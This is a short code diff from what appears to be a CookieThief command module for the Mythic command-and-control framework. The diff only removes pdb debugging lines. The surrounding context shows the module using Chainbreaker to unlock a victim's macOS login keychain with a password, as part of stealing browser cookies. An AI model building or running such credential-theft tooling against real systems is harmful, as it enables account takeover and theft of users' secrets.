@@ -4,8 +4,6 @@ import os
 from mythic_payloadtype_container.MythicRPC import *
 import chainbreaker.chainbreaker
 from chainbreaker.chainbreaker import Chainbreaker
-import pdb
-
 
 class CookieThiefArguments(TaskArguments):
     def __init__(self, command_line):
@@ -78,7 +76,6 @@ class CookieThiefCommand(CommandBase):
             sys.stdout.flush()
 
         try:
-            pdb.set_trace()
             keychain = Chainbreaker("/Mythic/mythic/tmp_login.keychain-db", unlock_password=password, unlock_key=None,
                                     unlock_file=None)
             dir(keychain)
